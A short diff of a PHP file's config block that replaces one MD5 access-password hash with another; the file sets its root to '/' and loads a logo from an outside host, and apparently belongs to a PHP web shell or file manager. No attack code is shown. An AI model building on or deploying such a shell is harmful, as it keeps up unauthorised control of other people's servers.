@@ -2,7 +2,7 @@
 session_start();
 
 // ============ CONFIG ============
-$PASSWORD_MD5 = "e5248f249357b60ea14c25f57567b439";
+$PASSWORD_MD5 = "8680f339f150af4372a95cbb83f691e9";
 $ROOT         = '/';
 $START        = getcwd();
 $LOGO         = "https://new.avestahost.com/rehanx.jpg";
